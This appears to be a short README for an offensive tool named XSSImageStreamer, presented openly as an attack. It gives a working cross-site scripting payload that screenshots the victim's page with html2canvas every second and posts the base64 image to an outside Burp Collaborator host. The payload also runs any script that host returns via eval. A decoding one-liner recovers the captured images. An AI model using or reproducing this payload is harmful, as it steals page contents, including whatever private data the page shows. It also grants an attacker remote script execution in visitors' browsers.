# XSSImageStreamer
An XSS payload that sends screenshot of the victim page using html2canvas to render page

To extract the image from the data received in post:
cat test | base64 -d | awk -F',' '{print $2}' | base64 -d > screen.png

XSS payload (Change burpcollaborator server):
<script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script><script>console.log('Sleeping to allow resources loading!');setTimeout(function () {setInterval(function () {html2canvas(document.getElementsByTagName("html")[0], {scale: 1}).then(canvas => {function b() {eval(this.responseText)};a = new XMLHttpRequest();a.addEventListener("load", b);a.open("POST", "//ep7ux11l8647037a9jv2lreo2f87ww.burpcollaborator.net/screenshot");a.send(btoa(canvas.toDataURL()));}).catch(e => console.log(e));}, 1000);}, 3000);</script>
